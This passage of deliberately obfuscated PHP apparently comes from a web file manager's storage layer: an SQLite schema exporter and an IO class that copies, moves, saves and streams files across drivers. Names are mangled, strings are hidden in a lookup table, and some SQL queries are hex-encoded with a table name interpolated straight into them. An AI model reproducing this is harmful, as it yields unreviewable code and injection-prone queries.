$ğ™¼¬ƒ½ . $’ÎÇõ™[1157], $’ÎÇõ™[1158] . $ğ™¼¬ƒ½ . $’ÎÇõ™[1159], implode($’ÎÇõ™[50] . PHP_EOL, $×ôÚ…Ó), $’ÎÇõ™[976]); $Ê³ãˆÀƒ = implode(PHP_EOL, array_merge($Ø¼ÈÈ…—, $æ¸›Ïï³)); if ($‚­îƒÓÕ && $‚­îƒÓÕ == $’ÎÇõ™[13]) { return $Ê³ãˆÀƒ; } $çµŠÓ = array($’ÎÇõ™[829] => $Ë¾âòâ, $’ÎÇõ™[13] => $Ê³ãˆÀƒ); return $‚­îƒÓÕ ? $çµŠÓ[$‚­îƒÓÕ] : $çµŠÓ; } public function sqlFromSqlite($‡ç„â–·, $Â½Š²€ = '') { $Ğ§šÄé„ =& $_SERVER[™»È’øè]; $ìŠØ­îî = $this->model()->db(); $­¬€´ÃŠ = "\120\122\x41\x47\115\x41\40\x54\x41\102\114\x45\137\111\116\x46\117\x20\50\x27{$‡ç„â–·}\47\51"; $œ¼¦÷şö = "\x53\105\x4c\x45\103\x54\x20\52\x20\x46\x52\x4f\115\x20\x73\161\x6c\151\164\x65\137\x6d\141\x73\164\145\x72\x20\x57\x48\105\x52\x45\40\x74\142\x6c\x5f\156\x61\155\x65\40\x3d\x20\47{$‡ç„â–·}\x27"; $ûºıß¼ = $ìŠØ­îî->query($­¬€´ÃŠ); if (empty($ûºıß¼)) { $Èû¹´ãˆ = array($Ğ§šÄé„[829] => $Ğ§šÄé„[12], $Ğ§šÄé„[13] => $Ğ§šÄé„[12]); return $Â½Š²€ ? $Èû¹´ãˆ[$Â½Š²€] : $Èû¹´ãˆ; } $’–û­« = $ìŠØ­îî->query($œ¼¦÷şö); $Åîà÷»˜ = $ÎÖñ°ºÚ = array(); foreach ($’–û­« as $•Èªñö) { if ($•Èªñö[$Ğ§šÄé„[33]] == $Ğ§šÄé„[322]) { $Åîà÷»˜[] = $•Èªñö[$Ğ§šÄé„[1160]]; } else { $ÎÖñ°ºÚ[$•Èªñö[$Ğ§šÄé„[32]]] = $•Èªñö[$Ğ§šÄé„[1160]]; } } $ú¾¹‡ƒÙ = array_merge(array($Ğ§šÄé„[1156] . $‡ç„â–· . $Ğ§šÄé„[118]), $Åîà÷»˜, array_values($ÎÖñ°ºÚ)); $ú¾¹‡ƒÙ = implode($Ğ§šÄé„[71] . PHP_EOL, $ú¾¹‡ƒÙ) . $Ğ§šÄé„[71]; if ($Â½Š²€ && $Â½Š²€ == $Ğ§šÄé„[13]) { return $ú¾¹‡ƒÙ; } $ ±ÏÙİ = array(); $ÍÒ¯•™Ë = array($Ğ§šÄé„[1148] => $Ğ§šÄé„[1161], $Ğ§šÄé„[358] => $Ğ§šÄé„[1162]); $¡ºÂıˆÌ = $Ğ§šÄé„[12]; foreach ($ûºıß¼ as $•Èªñö) { if ($•Èªñö[$Ğ§šÄé„[57]] == $Ğ§šÄé„[88]) { $¡ºÂıˆÌ = $•Èªñö[$Ğ§šÄé„[32]]; } $êÅ’³é = array($Ğ§šÄé„[428] . $•Èªñö[$Ğ§šÄé„[32]] . $Ğ§šÄé„[428], isset($ÍÒ¯•™Ë[$•Èªñö[$Ğ§šÄé„[33]]]) ? $ÍÒ¯•™Ë[$•Èªñö[$Ğ§šÄé„[33]]] : $•Èªñö[$Ğ§šÄé„[33]], $•Èªñö[$Ğ§šÄé„[35]] == $Ğ§šÄé„[88] ? $Ğ§šÄé„[1153] : $Ğ§šÄé„[1163] . $•Èªñö[$Ğ§šÄé„[56]], $•Èªñö[$Ğ§šÄé„[57]] == $Ğ§šÄé„[88] ? $Ğ§šÄé„[1164] : $Ğ§šÄé„[12]); $ ±ÏÙİ[] = trim(implode($Ğ§šÄé„[53], $êÅ’³é)); } foreach ($ÎÖñ°ºÚ as $ÇÄİÃ—¥ => $’®Ñş÷Š) { $äÒ÷šñü = str_replace($Ğ§šÄé„[1165] . $‡ç„â–· . $Ğ§šÄé„[11], $Ğ§šÄé„[12], $ÇÄİÃ—¥); $£îö¢ß§ = str_replace(array($Ğ§šÄé„[118], $Ğ§šÄé„[987]), $Ğ§šÄé„[428], substr($’®Ñş÷Š, stripos($’®Ñş÷Š, $Ğ§šÄé„[303]))); if ($äÒ÷šñü == $Ğ§šÄé„[1142]) { $¦³¥±‰¯ = $Ğ§šÄé„[1166] . $¡ºÂıˆÌ . $Ğ§šÄé„[1167]; } else { $¦³¥±‰¯ = (stripos($äÒ÷šñü, $Ğ§šÄé„[11]) ? $Ğ§šÄé„[1168] : $Ğ§šÄé„[12]) . ($Ğ§šÄé„[1169] . $äÒ÷šñü . $Ğ§šÄé„[1170] . $£îö¢ß§); } $ ±ÏÙİ[] = $¦³¥±‰¯; } $Ã‹Ñ¨©Œ = array($Ğ§šÄé„[1171] . $‡ç„â–· . $Ğ§šÄé„[1172], $Ğ§šÄé„[1173] . $‡ç„â–· . $Ğ§šÄé„[1174], implode($Ğ§šÄé„[50] . PHP_EOL, $ ±ÏÙİ), $Ğ§šÄé„[1175]); $µŒ¤ë¦ = implode(PHP_EOL, $Ã‹Ñ¨©Œ); if ($Â½Š²€ && $Â½Š²€ == $Ğ§šÄé„[829]) { return $µŒ¤ë¦; } $Èû¹´ãˆ = array($Ğ§šÄé„[829] => $µŒ¤ë¦, $Ğ§šÄé„[13] => $ú¾¹‡ƒÙ); return $Â½Š²€ ? $Èû¹´ãˆ[$Â½Š²€] : $Èû¹´ãˆ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ØŠ´Õ¦Ñ, $‚üÖ·ã´) { $ˆòñÔ®õ =& $_SERVER[™»È’øè]; $Éáş­º“ = $‚üÖ·ã´; $GLOBALS[$ˆòñÔ®õ[1176]] = $ˆòñÔ®õ[1177] . $ØŠ´Õ¦Ñ; Hook::trigger($ˆòñÔ®õ[1177] . $ØŠ´Õ¦Ñ . $ˆòñÔ®õ[1178], $Éáş­º“); $ˆª³Ã = self::driverMake($‚üÖ·ã´[0]); if (!$ˆª³Ã) { return !1; } if (method_exists($ˆª³Ã, $ØŠ´Õ¦Ñ)) { $°·éÎ¶Š = @call_user_func_array(array($ˆª³Ã, $ØŠ´Õ¦Ñ), $‚üÖ·ã´); } else { if (method_exists($ˆª³Ã, $ˆòñÔ®õ[1179])) { $°·éÎ¶Š = @call_user_func_array(array($ˆª³Ã, $ØŠ´Õ¦Ñ), $‚üÖ·ã´); } else { if (method_exists(self, $ØŠ´Õ¦Ñ)) { $°·éÎ¶Š = @call_user_func_array(array(self, $ØŠ´Õ¦Ñ), $‚üÖ·ã´); } else { $°·éÎ¶Š = call_user_func_array(array(parent, $ØŠ´Õ¦Ñ), $‚üÖ·ã´); } } } Hook::trigger($ˆòñÔ®õ[1177] . $ØŠ´Õ¦Ñ . $ˆòñÔ®õ[1180], $Éáş­º“, $°·éÎ¶Š); return $°·éÎ¶Š; } public static function init($³—ÑÀ£Ä) { return self::driverMake($³—ÑÀ£Ä); } public static function copy($¶³Íò«İ, $óœ¿íµÒ, $È…›ÌÙé = false, $ÇæÁ»ƒÎ = false) { return self::copyMoveStart($¶³Íò«İ, $óœ¿íµÒ, $È…›ÌÙé, $_SERVER[™»È’øè][585], $ÇæÁ»ƒÎ); } public static function move($µ¹·˜œÒ, $¤Ÿ‚©Ğì, $ÈÓ‰Ïó = false, $¬®¶È£Ç = false) { return self::copyMoveStart($µ¹·˜œÒ, $¤Ÿ‚©Ğì, $ÈÓ‰Ïó, $_SERVER[™»È’øè][587], $¬®¶È£Ç); } private static function copyMoveStart($î™üß¿®, $•ÃŠÄ¥, $€¡Ë±É¹, $“”üÀº³, $÷šêğÛ¼) { $ÎÂ“âÎã =& $_SERVER[™»È’øè]; $½ÒõÊò = array($î™üß¿®, $•ÃŠÄ¥, $€¡Ë±É¹, $÷šêğÛ¼); Hook::trigger($ÎÂ“âÎã[1177] . $“”üÀº³ . $ÎÂ“âÎã[1178], $½ÒõÊò); $•àÏ¤ÇÔ = self::copyMove($î™üß¿®, $•ÃŠÄ¥, $€¡Ë±É¹, $“”üÀº³, $÷šêğÛ¼); Hook::trigger($ÎÂ“âÎã[1177] . $“”üÀº³ . $ÎÂ“âÎã[1180], $½ÒõÊò, $•àÏ¤ÇÔ); return $•àÏ¤ÇÔ; } public static function saveFile($ÁÎ¯’˜±, $š¸åºË, $Î‹ÄŸ› = true) { $Õ¼ÜÑÚ =& $_SERVER[™»È’øè]; $ï‚×ğ—£ = self::info($š¸åºË); $êò²ÌÄÎ = self::driverMake($ÁÎ¯’˜±); $è°¢Ë±¯ = self::driverMake($š¸åºË); $—­»æ¯Ô = !1; if ($è°¢Ë±¯->pathParse[$Õ¼ÜÑÚ[1181]]) { $—­»æ¯Ô = $è°¢Ë±¯; $Üë¿Œşë = $è°¢Ë±¯->pathParse[$Õ¼ÜÑÚ[1181]]; $è°¢Ë±¯ = self::driverMake($Üë¿Œşë); } if ($êò²ÌÄÎ->pathParse[$Õ¼ÜÑÚ[1181]]) { $¸µ‚šç— = $êò²ÌÄÎ->pathParse[$Õ¼ÜÑÚ[1181]]; $êò²ÌÄÎ = self::driverMake($¸µ‚šç—); } $÷ìºğù¡ = $è°¢Ë±¯->pathFather($š¸åºË); $Ù“ğíÁ¥ = !0; if (!$Î‹ÄŸ› && self::driverIsSame($êò²ÌÄÎ, $è°¢Ë±¯)) { $Ù“ğíÁ¥ = !1; } $¢Áı¥Ëæ = self::copyFile($êò²ÌÄÎ, $ÁÎ¯’˜±, $è°¢Ë±¯, $÷ìºğù¡, $ï‚×ğ—£[$Õ¼ÜÑÚ[32]], $Ù“ğíÁ¥); if ($—­»æ¯Ô) { $¢Áı¥Ëæ = $—­»æ¯Ô->getPathOuter($¢Áı¥Ëæ); } return $¢Áı¥Ëæ; } private static function copyMove($š¬çÅè‘, $´­ªªÙØ, $€Ü¨¸ã, $¦…È ‚‰, $ÃùÛ”Ùß = false) { $ÓåÆƒ =& $_SERVER[™»È’øè]; if (!$š¬çÅè‘ || $š¬çÅè‘ == $ÓåÆƒ[8] || !$´­ªªÙØ) { return !1; } ignore_timeout(); $–½ï¡ë = self::driverMake($š¬çÅè‘); $ö…ÊÙÈ± = self::driverMake($´­ªªÙØ); $İ®Şüèˆ = $¦…È ‚‰ == $ÓåÆƒ[587]; $³û×Ö·ğ = !1; if ($ö…ÊÙÈ±->pathParse[$ÓåÆƒ[1181]]) { $³û×Ö·ğ = $ö…ÊÙÈ±; $´­ªªÙØ = $ö…ÊÙÈ±->pathParse[$ÓåÆƒ[1181]]; $ö…ÊÙÈ± = self::driverMake($´­ªªÙØ); } if ($–½ï¡ë->pathParse[$ÓåÆƒ[1181]]) { $š¬çÅè‘ = $–½ï¡ë->pathParse[$ÓåÆƒ[1181]]; $–½ï¡ë = self::driverMake($š¬çÅè‘); } self::check($–½ï¡ë, $š¬çÅè‘, $ö…ÊÙÈ±, $´­ªªÙØ); Hook::trigger($ÓåÆƒ[1182], $–½ï¡ë, $š¬çÅè‘, $ö…ÊÙÈ±, $´­ªªÙØ); $çÃ”×û = self::driverIsSame($–½ï¡ë, $ö…ÊÙÈ±); if ($çÃ”×û) { if ($¦…È ‚‰ == $ÓåÆƒ[587] && !method_exists($ö…ÊÙÈ±, $ÓåÆƒ[1183]) && trim($´­ªªÙØ, $ÓåÆƒ[8]) == trim($ö…ÊÙÈ±->pathFather($š¬çÅè‘), $ÓåÆƒ[8])) { if ($–½ï¡ë->pathThis($š¬çÅè‘) != $ÃùÛ”Ùß && !$–½ï¡ë->isTypeObject()) { return $–½ï¡ë->rename($š¬çÅè‘, $ÃùÛ”Ùß); } return $ö…ÊÙÈ±->getPathOuter($š¬çÅè‘); } if (method_exists($ö…ÊÙÈ±, $¦…È ‚‰)) { return $ö…ÊÙÈ±->{$¦…È ‚‰}($š¬çÅè‘, $´­ªªÙØ, $€Ü¨¸ã, $ÃùÛ”Ùß); } } if ($çÃ”×û && $¦…È ‚‰ == $ÓåÆƒ[587] && $ö…ÊÙÈ±->getType() == $ÓåÆƒ[106]) { $ŒÉö¬Ä× = $ö…ÊÙÈ±->movePath($š¬çÅè‘, $´­ªªÙØ, $ÃùÛ”Ùß); if ($ŒÉö¬Ä×) { return $ŒÉö¬Ä×; } } $ù÷İı— = $–½ï¡ë->isFile($š¬çÅè‘); if (!$ù÷İı— && $ö…ÊÙÈ±->getType() == $ÓåÆƒ[782] && $–½ï¡ë->getType() == $ÓåÆƒ[106]) { $ŒÉö¬Ä× = $ö…ÊÙÈ±->copyFolderFromIO($–½ï¡ë, $š¬çÅè‘, $´­ªªÙØ, $€Ü¨¸ã, $İ®Şüèˆ, $ÃùÛ”Ùß); } else { $ŒÉö¬Ä× = self::copyPath($–½ï¡ë, $š¬çÅè‘, $ö…ÊÙÈ±, $´­ªªÙØ, $€Ü¨¸ã, $İ®Şüèˆ, $ù÷İı—, $ÃùÛ”Ùß); } if ($ŒÉö¬Ä× && $İ®Şüèˆ) { $–½ï¡ë->remove($š¬çÅè‘); } if ($³û×Ö·ğ) { $ŒÉö¬Ä× = $³û×Ö·ğ->getPathOuter($ŒÉö¬Ä×); } return $ŒÉö¬Ä×; } private static function check($«„ŠÚ‡½, $±ßİÈ˜”, $‰ÃÈìÑ¥, &$şß«Õ“á) { $ŠÒ±¤˜ =& $_SERVER[™»È’øè]; if (self::driverIsSame($«„ŠÚ‡½, $‰ÃÈìÑ¥) && $«„ŠÚ‡½->isFolder($±ßİÈ˜”) && $«„ŠÚ‡½->isParentOf($±ßİÈ˜”, $şß«Õ“á)) { show_json(LNG($ŠÒ±¤˜[1184]), !1); } if (!$«„ŠÚ‡½->exist($±ßİÈ˜”)) { show_json(LNG($ŠÒ±¤˜[105]), !1); } } private static function copyPath($äÒâÈÖÓ, $ÇÄ­óĞÆ, $“¢Ü´Õ, $œ‚ä•­Ç, $¯Ç‘Îìı, $À®Äş„, $Ş÷›å­, $õ®ˆ¼Àá = false, $¢‡Ë‹ = true) { $ï»ëŒù³ =& $_SERVER[™»È’øè]; $´ÜÂ´²À = empty($õ®ˆ¼Àá) && $õ®ˆ¼Àá !== $ï»ëŒù³[211] ? $äÒâÈÖÓ->pathThis($ÇÄ­óĞÆ) : $õ®ˆ¼Àá; if ($¯Ç‘Îìı) { $Úª±­™ = $“¢Ü´Õ->fileNameExist($œ‚ä•­Ç, $´ÜÂ´²À); $½äêÄøÔ = $´ÜÂ´²À; $´ÜÂ´²À = $“¢Ü´Õ->fileNameAuto($œ‚ä•­Ç, $´ÜÂ´²À, $¯Ç‘Îìı, !$Ş÷›å­); if (!$Úª±­™ || $½äêÄøÔ != $´ÜÂ´²À) { $¯Ç‘Îìı = !1; } if ($¢‡Ë‹ && !$¯Ç‘Îìı) { $“¢Ü´Õ->_data[$ï»ëŒù³[1185]] = !0; } } if ($Ş÷›å­) { return self::copyFile($äÒâÈÖÓ, $ÇÄ­óĞÆ, $“¢Ü´Õ, $œ‚ä•­Ç, $´ÜÂ´²À, $À®Äş„); } if ($¯Ç‘Îìı == REPEAT_RENAME_FOLDER) { $¯Ç‘Îìı = !1; } $®ûÊ“Í¢ = rtrim($œ‚ä•­Ç, $ï»ëŒù³[8]) . $ï»ëŒù³[8] . $´ÜÂ´²À; $…ôâ›Ğº = $“¢Ü´Õ->mkdir($“¢Ü´Õ->getPath($®ûÊ“Í¢), $¯Ç‘Îìı); $œ‚ä•­Ç = $“¢Ü´Õ->getPathInner($…ôâ›Ğº); $©ÛĞ°¿Œ = $äÒâÈÖÓ->listPath($ÇÄ­óĞÆ, !0); $©ÛĞ°¿Œ = is_array($©ÛĞ°¿Œ) ? $©ÛĞ°¿Œ : array($ï»ëŒù³[83] => array(), $ï»ëŒù³[82] => array()); $ƒÎè–¸Á = array_merge($©ÛĞ°¿Œ[$ï»ëŒù³[83]], $©ÛĞ°¿Œ[$ï»ëŒù³[82]]); foreach ($ƒÎè–¸Á as $ÀñØ’Ò) { $á®°Âû¡ = $ÀñØ’Ò[$ï»ëŒù³[33]] == $ï»ëŒù³[213]; $ÇÄ­óĞÆ = $äÒâÈÖÓ->getPathInner($ÀñØ’Ò[$ï»ëŒù³[84]]); $Àí«¶©¥ = self::copyPath($äÒâÈÖÓ, $ÇÄ­óĞÆ, $“¢Ü´Õ, $œ‚ä•­Ç, $¯Ç‘Îìı, $À®Äş„, $á®°Âû¡, !1, !1); if (!$Àí«¶©¥) { IO::errorTips($ï»ëŒù³[1186] . $ÇÄ­óĞÆ . $ï»ëŒù³[70] . $œ‚ä•­Ç); } } self::copyMoveKeepInfo($äÒâÈÖÓ, $ÇÄ­óĞÆ, $…ôâ›Ğº); return $…ôâ›Ğº; } private static function copyFile($Š¨çÅÍĞ, $çè½×Î”, $íİ½ÉìÙ, $–»…®‹Ü, $—äîú†„, $·øš’¨) { $üä›âç =& $_SERVER[™»È’øè]; $–»…®‹Ü = $íİ½ÉìÙ->getPath(rtrim($–»…®‹Ü, $üä›âç[8]) . $üä›âç[8] . $—äîú†„); $ú×ÌÑÀê = $üä›âç[1187] . time() . rand_string(5); Hook::trigger($üä›âç[1188], $Š¨çÅÍĞ, $çè½×Î”, $íİ½ÉìÙ, $–»…®‹Ü, $—äîú†„, $ú×ÌÑÀê); if (self::driverIsSame($Š¨çÅÍĞ, $íİ½ÉìÙ)) { if ($·øš’¨) { $şŒìİíÉ = $íİ½ÉìÙ->moveFile($çè½×Î”, $–»…®‹Ü); } else { $şŒìİíÉ = $íİ½ÉìÙ->copyFile($çè½×Î”, $–»…®‹Ü); } Hook::trigger($üä›âç[1189], $Š¨çÅÍĞ, $çè½×Î”, $íİ½ÉìÙ, $–»…®‹Ü, $—äîú†„, $şŒìİíÉ); self::copyMoveKeepInfo($Š¨çÅÍĞ, $çè½×Î”, $şŒìİíÉ); return $şŒìİíÉ; } $€¯ı¥êÀ = TEMP_FILES; if ($GLOBALS[$üä›âç[6]][$üä›âç[89]][$üä›âç[821]]) { $€¯ı¥êÀ = $GLOBALS[$üä›âç[6]][$üä›âç[89]][$üä›âç[821]]; } $Ô€ôğ£Ğ = $€¯ı¥êÀ; mk_dir($Ô€ôğ£Ğ); $«Í—¬ÕÍ = $Ô€ôğ£Ğ . $ú×ÌÑÀê; $Á§Şù›‹ = $«Í—¬ÕÍ; $«Í—¬ÕÍ = $Š¨çÅÍĞ->download($çè½×Î”, $«Í—¬ÕÍ); $«Í—¬ÕÍ = $Š¨çÅÍĞ->iconvApp($«Í—¬ÕÍ); if (substr($«Í—¬ÕÍ, strlen($€¯ı¥êÀ)) == $€¯ı¥êÀ) { $·øš’¨ = !0; } $şŒìİíÉ = $íİ½ÉìÙ->upload($–»…®‹Ü, $«Í—¬ÕÍ, $·øš’¨); self::remove($Á§Şù›‹); Hook::trigger($üä›âç[1189], $Š¨çÅÍĞ, $çè½×Î”, $íİ½ÉìÙ, $–»…®‹Ü, $—äîú†„, $şŒìİíÉ); self::copyMoveKeepInfo($Š¨çÅÍĞ, $çè½×Î”, $şŒìİíÉ); return $şŒìİíÉ; } private static function copyMoveKeepInfo($ù€ùÑÚ¿, $ÜÑ‹‡Ø, $¾ºíŒ¨º) { if (!$¾ºíŒ¨º) { return; } $’ûìÛİÒ = $ù€ùÑÚ¿->info($ÜÑ‹‡Ø); if (!is_array($’ûìÛİÒ)) { return; } IO::setModifyTime($¾ºíŒ¨º, $’ûìÛİÒ[$_SERVER[™»È’øè][85]]); } public static function pathFather($©ÜŠ±ğ) { $¶øØïÀ€ = IO::init($©ÜŠ±ğ); $Ô»ª·“ = $¶øØïÀ€->pathFather($¶øØïÀ€->path); return $¶øØïÀ€->getPathOuter($Ô»ª·“); } public static function fileOut($›¹ïÅçñ, $ª›Ùéı¡ = false, $½ÅÚñË = false, $ê¤„ŸøÀ = '') { $’ ŞÃÜ– = self::driverMake($›¹ïÅçñ); if ($’ ŞÃÜ–->isFileOutServer()) { return $’ ŞÃÜ–->fileOutServer($›¹ïÅçñ, $ª›Ùéı¡, $½ÅÚñË, $ê¤„ŸøÀ); } return $’ ŞÃÜ–->fileOut($›¹ïÅçñ, $ª›Ùéı¡, $½ÅÚñË, $ê¤„ŸøÀ); } public static function fileOutImage($­•ø¯—è, $äù•ËÚù = 250) { $Šˆ‘‘ = array(250, 600, 1200, 2000, 3000, 5000); for ($•Á‹»û· = 0; $•Á‹»û· < count($Šˆ‘‘); $•Á‹»û·++) { if ($•Á‹»û· == 0 && $äù•ËÚù <= $Šˆ‘‘[$•Á‹»û·]) { $äù•ËÚù = $Šˆ‘‘[$•Á‹»û·]; break; } else { if ($äù•ËÚù > $Šˆ‘‘[$•Á‹»û· - 1] && $äù•ËÚù <= $Šˆ‘‘[$•Á‹»û·]) { $äù•ËÚù = $Šˆ‘‘[$•Á‹»û·]; break; } else { if ($•Á‹»û· == count($Šˆ‘‘) - 1 && $äù•ËÚù > $Šˆ‘‘[$•Á‹»û·]) { $äù•ËÚù = $Šˆ‘‘[$•Á‹»û·]; break; } } } } $¢¯ŒÑÁÔ = self::driverMake($­•ø¯—è); if ($¢¯ŒÑÁÔ->isFileOutServer()) { return $¢¯ŒÑÁÔ->fileOutImageServer($­•ø¯—è, $äù•ËÚù); } return $¢¯ŒÑÁÔ->fileOutImage($­•ø¯—è, $äù•ËÚù); } private static function driverIsSame($”¨Ÿğ±•, $‡…Şû”×) { $±Œèşâ÷ =& $_SERVER[™»È’øè]; $Œ™º¿“Ë = $”¨Ÿğ±•->getType(); $æ•ÅÅÄ£ = $‡…Şû”×->getType(); if ($Œ™º¿“Ë != $æ•ÅÅÄ£) { return !1; } if ($Œ™º¿“Ë == $±Œèşâ÷[782]) { return !0; } if ($Œ™º¿“Ë == $±Œèşâ÷[106]) { return !0; } if ($”¨Ÿğ±•->pathDriver == $‡…Şû”×->pathDriver) { return !0; } return !1; } public static function copyUpdate($İÃà©Ó¤, $Âª€Óç—) { $ôæ£ğ–Ã =& $_SERVER[™»È’øè]; if (!IO::exist($İÃà©Ó¤)) { return !1; } if (!IO::exist($Âª€Óç—)) { IO::mkdir($Âª€Óç—); } $íà„Ê‰ = array_to_keyvalue(self::listAllSimple($İÃà©Ó¤), $ôæ£ğ–Ã[84]); $×¹É–ö = array_to_keyvalue(self::listAllSimple($Âª€Óç—), $ôæ£ğ–Ã[84]); $ØÏ›–×² = array(); $Ë³ûÈæ‹ = array(); foreach ($íà„Ê‰ as $’»ïÁ¹ => $àç€¶ÍÍ) { if (isset($×¹É–ö[$’»ïÁ¹])) { if ($àç€¶ÍÍ[$ôæ£ğ–Ã[75]] == 1) { continue; } if ($×¹É–ö[$’»ïÁ¹][$ôæ£ğ–Ã[76]] == $àç€¶ÍÍ[$ôæ£ğ–Ã[76]]) { continue; } } if ($àç€¶ÍÍ[$ôæ£ğ–Ã[75]] == 1) { $Ë³ûÈæ‹[] = $Âª€Óç— . $ôæ£ğ–Ã[8] . trim($’»ïÁ¹, $ôæ£ğ–Ã[8]); continue; } $²áİ½¡ = strstr(trim($’»ïÁ¹, $ôæ£ğ–Ã[8]), $ôæ£ğ–Ã[8]) ? get_path_father($’»ïÁ¹) : $ôæ£ğ–Ã[12]; $ØÏ›–×²[] = array($ôæ£ğ–Ã[1190] => $àç€¶ÍÍ[$ôæ£ğ–Ã[86]], $ôæ£ğ–Ã[1191] => rtrim($Âª€Óç—, $ôæ£ğ–Ã[8]) . $ôæ£ğ–Ã[8] . $²áİ½¡, $ôæ£ğ–Ã[1192] => $àç€¶ÍÍ); } $–š‡ğŠ¤ = array($ôæ£ğ–Ã[213] => $ØÏ›–×², $ôæ£ğ–Ã[75] => $Ë³ûÈæ‹); Hook::trigger($ôæ£ğ–Ã[1193], $İÃà©Ó¤, $Âª€Óç—, $–š‡ğŠ¤); foreach ($Ë³ûÈæ‹ as $àç€¶ÍÍ) { IO::mkdir($àç€¶ÍÍ); } foreach ($ØÏ›–×² as $àç€¶ÍÍ) { IO::copy($àç€¶ÍÍ[$ôæ£ğ–Ã[1190]], $àç€¶ÍÍ[$ôæ£ğ–Ã[1191]], REPEAT_REPLACE); } } public static function fileSubstr($¼Œ›Ä™, $êÃ€æèã, $âÛ¶äê– = false) { $Í¢´¥¬è =& $_SERVER[™»È’øè]; $îïœ°ˆš = self::driverMake($¼Œ›Ä™); $Î¢û™ª = $îïœ°ˆš->size($¼Œ›Ä™); $Ÿ…ÆÙıÎ = $êÃ€æèã; $åÔ²‡ã£ = $âÛ¶äê–; if ($êÃ€æèã < 0) { $êÃ€æèã = $Î¢û™ª + $êÃ€æèã; } if ($âÛ¶äê– === !1) { $âÛ¶äê– = $Î¢û™ª - $êÃ€æèã; } if ($êÃ€æèã + $âÛ¶äê– > $Î¢û™ª) { $âÛ¶äê– = $Î¢û™ª - $êÃ€æèã; } if (!$Î¢û™ª && $îïœ°ˆš->getType() == $Í¢´¥¬è[106] && !$îïœ°ˆš->exist($¼Œ›Ä™)) { $–÷íØ¡î = get_path_this($¼Œ›Ä™); $Ä‰¦Ê»ü = parse_url_query($–÷íØ¡î); if (is_array($Ä‰¦Ê»ü) && isset($Ä‰¦Ê»ü[$Í¢´¥¬è[32]])) { $–÷íØ¡î = urldecode($Ä‰¦Ê»ü[$Í¢´¥¬è[32]]); } throw new Exception($Í¢´¥¬è[1194] . LNG($Í¢´¥¬è[1195]) . $Í¢´¥¬è[996] . clear_html($–÷íØ¡î) . $Í¢´¥¬è[12]); } if ($âÛ¶äê– <= 0) { return $Í¢´¥¬è[12]; } if ($êÃ€æèã < 0 || $êÃ€æèã >= $Î¢û™ª || $âÛ¶äê– > 1024 * 1024 * 10) { throw new Exception("\x66\151\x6c\x65\122\145\141\144\40\x65\x72\162\x6f\162\x21\40\163\164\x61\162\x74\x3d{$êÃ€æèã}\73\x6c\x65\156\x67\x74\150\75{$âÛ¶äê–}\x3b\40\x73\151\172\145\x3d{$Î¢û™ª}\x3b"); } $ÜÀã¦ÏØ = $îïœ°ˆš->fileSubstr($¼Œ›Ä™, $êÃ€æèã, $âÛ¶äê–); if (!$ÜÀã¦ÏØ && $âÛ¶äê– && isset($GLOBALS[$Í¢´¥¬è[1196]])) { throw new Exception($GLOBALS[$Í¢´¥¬è[1196]][$Í¢´¥¬è[1197]]); } return $ÜÀã¦ÏØ; } private static function driverMake(&$„±¸¼ßÀ) { $ËªÑêıÌ =& $_SERVER[™»È’øè]; $öî«Õ†´ = KodIO::parse($„±¸¼ßÀ); if (!self::$driverListSystem) { $ü“›óÎ‘ = Model($ËªÑêıÌ[792])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ü“›óÎ‘, $ËªÑêıÌ[442]); } if ($öî«Õ†´[$ËªÑêıÌ[33]] == KodIO::KOD_IO && !self::$driverListSystem[$öî«Õ†´[$ËªÑêıÌ[442]]]) { return !1; } $„±¸¼ßÀ = $öî«Õ†´[$ËªÑêıÌ[1198]]; $ÔÆ—ÈàĞ = self::driverGet($öî«Õ†´, $„±¸¼ßÀ); return $ÔÆ—ÈàĞ; } private static function driverGet($´°ì¥, &$È†êÄçÂ) { $À“Šıö¤ =& $_SERVER[™»È’øè]; $›çøÍˆ = $´°ì¥[$À“Šıö¤[1199]]; $úËú‹ÒÈ = $´°ì¥[$À“Šıö¤[442]]; switch ($´°ì¥[$À“Šıö¤[33]]) { case KodIO::KOD_IO: $ÙıÂâœ“ = self::$driverListSystem[$úËú‹ÒÈ]; break; case KodIO::KOD_SOURCE: $È†êÄçÂ = $úËú‹ÒÈ . $È†êÄçÂ; $ÙıÂâœ“ = array($À“Šıö¤[1200] => $À“Šıö¤[1201], $À“Šıö¤[6] => $´°ì¥); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ÑËÒïÏ‘ = $GLOBALS[$À“Šıö¤[1202]]; self::$driverListUser = array_to_keyvalue($ÑËÒïÏ‘, $À“Šıö¤[442]); } $ÙıÂâœ“ = self::$driverListUser[$úËú‹ÒÈ]; break; case KodIO::KOD_SHARE_LINK: $ÙıÂâœ“ = array($À“Šıö¤[1200] => $À“Šıö¤[1203], $À“Šıö¤[6] => $´°ì¥); $äŞØ±‡í = Action($À“Šıö¤[1204])->sharePathInfo($´°ì¥[$À“Šıö¤[84]]); $È†êÄçÂ = $äŞØ±‡í[$À“Šıö¤[180]]; if (!$äŞØ±‡í[$À“Šıö¤[180]]) { $Ï¶·ˆ’Á = Model($À“Šıö¤[631])->getInfo($äŞØ±‡í[$À“Šıö¤[632]]); $È†êÄçÂ = KodIO::clear($Ï¶·ˆ’Á[$À“Šıö¤[1205]] . $´°ì¥[$À“Šıö¤[1198]]); $´°ì¥[$À“Šıö¤[527]] = $Ï¶·ˆ’Á; $´°ì¥[$À“Šıö¤[1181]] = $È†êÄçÂ; $ÙıÂâœ“ = array($À“Šıö¤[1200] => $À“Šıö¤[1206], $À“Šıö¤[6] => $´°ì¥); } break; case KodIO::KOD_SHARE_ITEM: $ÙıÂâœ“ = array($À“Šıö¤[1200] => $À“Šıö¤[1207], $À“Šıö¤[6] => $´°ì¥); $Ï¶·ˆ’Á = Model($À“Šıö¤[631])->getInfo($´°ì¥[$À“Šıö¤[442]]); if ($Ï¶·ˆ’Á[$À“Šıö¤[180]] == $À“Šıö¤[211]) { $È†êÄçÂ = KodIO::clear($Ï¶·ˆ’Á[$À“Šıö¤[1205]] . $´°ì¥[$À“Šıö¤[1198]]); $´°ì¥[$À“Šıö¤[527]] = $Ï¶·ˆ’Á; $´°ì¥[$À“Šıö¤[1181]] = $È†êÄçÂ; $ÙıÂâœ“ = array($À“Šıö¤[1200] => $À“Šıö¤[1208], $À“Šıö¤[6] => $´°ì¥); } else { if (!$È†êÄçÂ) { $È†êÄçÂ = 